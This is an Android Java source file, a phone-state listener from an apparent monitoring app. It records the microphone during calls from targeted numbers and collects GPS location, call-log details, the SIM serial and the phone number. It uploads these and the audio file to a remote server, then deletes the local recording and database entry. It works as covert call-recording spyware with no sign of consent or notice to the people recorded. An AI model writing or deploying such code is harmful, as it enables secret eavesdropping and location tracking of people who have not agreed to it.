package com.privacy.monitor.listener;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import com.privacy.monitor.base.C;
import com.privacy.monitor.db.CallRecordDB;
import com.privacy.monitor.db.MonitorDB;
import com.privacy.monitor.domain.CallRecord;
import com.privacy.monitor.domain.Monitor;
import com.privacy.monitor.inte.RunBack;
import com.privacy.monitor.location.LocationMan;
import com.privacy.monitor.resolver.field.CallConstant;
import com.privacy.monitor.util.HttpUtil;
import com.privacy.monitor.util.NetworkUtil;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * 通话状态监听
 */
public class MyPhoneStateListener extends PhoneStateListener {
	
	 private static final String TAG =MyPhoneStateListener.class.getSimpleName();
     File audioFile;
     File recordFile;
     MediaRecorder mediaRecorder ;
     Context context;
     boolean iscall = false;
     private MonitorDB monitorDB;
     private boolean isMonitor = false;
     private String longitude, latitude,soundPath="";
     private CallRecordDB callRecordDB ;
     
     
     public MyPhoneStateListener(Context context,File file){
             this.context = context;
             iscall = false;
             this.audioFile=file;
             monitorDB = MonitorDB.getInstance(context);
             callRecordDB = CallRecordDB.getInstance(context);
     }
     
     
     @Override
     public void onCallStateChanged(int state, String incomingNumber) {
             super.onCallStateChanged(state, incomingNumber);
             
             switch(state){
             case TelephonyManager.CALL_STATE_RINGING://电话铃响
                     try {
                    	 if(monitorDB !=null){
                    		Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? " ,new String []{incomingNumber});
                    		if(monitor !=null){
                    			String callMonitorStatus = monitor.getCallMonitorStatus();
                    			String locationStatus = monitor.getLocationStatus();
                    			if("1".equals(callMonitorStatus)){
                    				recordCallComment();
                    				isMonitor = true;
                    			}
                    			if("1".equals(locationStatus)){
                    				LocationMan locationMan = new LocationMan(context);
                    				locationMan.setRunBack(new MyRunback());
                    				locationMan.startLocaiton();
                    			}
                    		}
                    	 }
                     } catch (IOException e1) {
                             e1.printStackTrace();
                             stopRecord();
                     }
                     Log.d(TAG, "CALL_STATE_RINGING:电话铃响");
                     break;
             case TelephonyManager.CALL_STATE_OFFHOOK://摘机(处于通话中)
                     iscall = true;
                     Log.d(TAG, "CALL_STATE_OFFHOOK:通话中");
                     try {
                    	 if(isMonitor){
                    		  recordCallComment(); 
                    	 }
                     } catch (IOException e) {
                             e.printStackTrace();
                             stopRecord();
                     }
                     
                     break;
             case TelephonyManager.CALL_STATE_IDLE://空闲(处于待机状态)
                     Log.d(TAG, "CALL_STATE_IDLE:空闲中");
                     if(iscall){
                            stopRecord();
                            iscall = false;
                            if(isMonitor){
                            	if(context !=null){
                            		 ContentResolver mResolver = context.getContentResolver();
                            		 if(mResolver !=null){
                            			 Cursor cursor = mResolver.query(CallConstant.CONTENT_URI, new String[] {
                            						CallConstant.NAME, CallConstant.DATE, CallConstant.DURAITON,
                            						CallConstant.NUMBER, CallConstant.NEW }, null, null,"_id DESC LIMIT 1");
                            			 if(cursor !=null){
                            				 while (cursor.moveToNext()) {
                            						String name = cursor.getString(cursor.getColumnIndex(CallConstant.NAME));
                            						String date = cursor.getString(cursor.getColumnIndex(CallConstant.DATE));
                            						String duration = cursor.getString(cursor.getColumnIndex(CallConstant.DURAITON));
                            						String number = cursor.getString(cursor.getColumnIndex(CallConstant.NUMBER));
                            						String newss = cursor.getString(cursor.getColumnIndex(CallConstant.NEW));
                            						String deviewname = android.os.Build.MODEL;
                            						String endTime = date+""+duration;
                            						CallRecord callRecord = new CallRecord();
                            						callRecord.setCallName(name);
                            						callRecord.setCallStartTime(date);
                            						callRecord.setCallStopTime(endTime);
                            						callRecord.setDeviceName(deviewname);
                            						callRecord.setPhoneNumber(number);
                            						callRecord.setCallStatus(newss);
                            						callRecord.setLat(latitude);
                            						callRecord.setLon(longitude);
                            						callRecord.setDeviceName(android.os.Build.MODEL);
                            						SharedPreferences sp = context.getSharedPreferences(C.PHONE_INFO,Context.MODE_PRIVATE);
                            						callRecord.setMyPhone(sp.getString(C.PHONE,""));
                            						callRecord.setSimID(sp.getString(C.SIM_SERIAL,""));
                            						callRecord.setSoundRecordPath(soundPath);
                            						callRecordDB.insert(callRecord);
                            						if(HttpUtil.detect(context)){
                            							String result =NetworkUtil.uploadCall(callRecord.getMyPhone(),number,name,date,endTime,callRecord.getSimID(),callRecord.getLon(),callRecord.getLat(),callRecord.getDeviceName(),callRecord.getCallStatus());
                            						    if(!result.startsWith("FAIL")){
                            						    	if(isMonitor){
                            						    		if(result.startsWith(callRecord.getMyPhone()+"/"+callRecord.getMyPhone()+"_"+number+"_"+newss) && !"".equals(soundPath)){
                                						    		String uploadFileResult = NetworkUtil.uploadFile(result, soundPath);
                                						    		if(uploadFileResult.contains("FAULT")){
                                						    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,date});
                                						    		}else {
    																	callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
    																	File file = new File(soundPath);
    																	if(file.exists()){
    																		if(file.isFile()){
    																			file.delete();
    																		}
    																	}
    																}
                                						    	}
                            						    	}else {
                                						    	callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
    														}
                            						    }
                            						}
                            						break;
                            					}
                            				 cursor.close();
                            			 }
                            		 }
                            	}
                            }
                     }
                     break;
             }
     }
     
     public void recordCallComment() throws IOException{
         if(mediaRecorder == null){
                 mediaRecorder = new MediaRecorder();
                 //audioRecord.
                 // 設置聲音源(麥克風)
                 mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                     //recordFile = File.createTempFile("record_",".amr",audioFile);
                 mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                     //Log.d(TAG, "文件路径:"+recordFile.getAbsolutePath());
                     // 设置输出声音文件的路径
                 long currentTime = new Date().getTime();
                 soundPath = context.getFilesDir()+(currentTime+"")+".3gpp";
                 mediaRecorder.setOutputFile(soundPath);
                 mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                 mediaRecorder.setOnErrorListener(null);
                 mediaRecorder.setOnInfoListener(null);
                 mediaRecorder.prepare();
                 //mediaRecorder.start();
         }else {
                 mediaRecorder.start();
             }
             
     }
     
     public void stopRecord(){
             if(mediaRecorder !=null ){
                     if(iscall){
                             //mediaRecorder.release();
                             mediaRecorder.stop();
                             mediaRecorder.reset();
                             mediaRecorder.release();
                             mediaRecorder = null;
                     }
             }
     }
     
     private class MyRunback implements RunBack{

		@Override
		public void run() {
			
		}

		@Override
		public void run(Object object) {
			if(object instanceof String []){
				String [] locationInfo = (String[]) object;
				if(locationInfo !=null && locationInfo.length==2){
					latitude = locationInfo[0];
					longitude = locationInfo[1];
				}
			}
		}
     }
     
     
}
